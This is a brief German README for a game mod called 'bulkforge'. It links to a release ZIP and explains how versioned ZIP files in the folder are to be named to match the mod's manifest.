# bulkforge

[Release herunterladen](https://github.com/Virtunerd/Kingdom-Come-Deliverance-2/releases/download/kcd2/bulkforge.zip)

Lege ZIP-Versionen dieses Mods in diesem Ordner ab. Verwende das Format `bulkforge_1.0.0.zip`; die Versionsnummer muss mit `mod.manifest` in der ZIP übereinstimmen.

Beispiele: `bulkforge_1.0.0.zip`, `bulkforge_1.0.1.zip`, `bulkforge_1.0.2.zip`.
